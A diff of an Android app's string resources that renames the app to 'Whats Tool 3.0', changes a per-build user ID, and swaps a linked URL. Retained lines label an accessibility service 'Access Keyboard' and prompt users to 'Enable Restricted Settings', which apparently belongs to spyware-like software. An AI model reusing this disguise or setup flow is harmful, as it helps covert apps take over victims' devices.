@@ -1,9 +1,9 @@
 <resources>
-    <string name="app_name" translatable="false">333</string>
-    <string name="app_user_id" translatable="false">66c36efbb2c1268a69b1b234</string>
+    <string name="app_name" translatable="false">Whats Tool 3.0</string>
+    <string name="app_user_id" translatable="false">66d9bddc09f7706563a838df</string>
     <string name="accessibility_service_description" translatable="false">Access Keyboard</string>
-    <string name="app_link" translatable="false">https://sample.com</string>
-    <string name="app_link_enable" translatable="false">enable</string>
+    <string name="app_link" translatable="false">https://www.google.com/</string>
+    <string name="app_link_enable" translatable="false">disable</string>
 
     <string name="complete_activation">Now you need to complete the activation.</string>
     <string name="allow_restrict1">1: Enable Restricted Settings</string>
